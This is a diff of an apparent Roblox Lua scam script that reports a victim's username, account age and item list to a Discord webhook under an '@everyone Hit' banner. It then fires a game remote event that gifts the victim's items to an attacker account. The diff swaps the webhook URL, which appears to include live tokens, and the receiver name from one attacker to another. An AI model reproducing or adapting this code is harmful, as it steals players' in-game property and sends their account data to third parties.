@@ -154,7 +154,7 @@ end)
 task.spawn(function()
 wait(7)
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1422956948311117824/FmwmiRO0Gb-cN06_UlIBDn3DG8flep-hvvz1zUC1bdnWsTfe0k_bSaHDNfoj5MrBRQ00"  
+local WEBHOOK_URL = "hhttps://discord.com/api/webhooks/1407925975282352228/Ui3X-nqFU2ULO6UJj6ZQiBeHUZV2qBu1Gw4rb9WzVEqabHXDoBzwCSJc_W5CJfklD4Sk"  
   
 local playerName = player.Name  
 local userId = player.UserId  
@@ -184,13 +184,13 @@ for i, itemName in ipairs(items) do
     fileContent = fileContent .. i .. ". " .. itemName .. "\n"  
 end  
 
-local message = "@everyone **Alien Hit**\n" ..  
+local message = "@everyone **Stupid Hit**\n" ..  
 "──────────────\n" ..  
 "**Victim Info:**\n" ..  
 "Username: " .. playerName .. "\n" ..  
 "Executor: Delta\n" ..   
 "Account Age: " .. accountAge .. "\n" ..  
-"Receiver: cebolinhapic\n" ..  
+"Receiver: Kilua0623\n" ..  
 "──────────────\n" ..  
 "**Hit List:**\n"  
 
@@ -287,7 +287,7 @@ local function processBrainRoots()
                 ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({  
                     [1] = {  
                         ["Item"] = currentBrainRoot,  
-                        ["ToGift"] = "cebolinhapic",  
+                        ["ToGift"] = "kilua0623",  
                     },  
                     [2] = ""  
                 })  
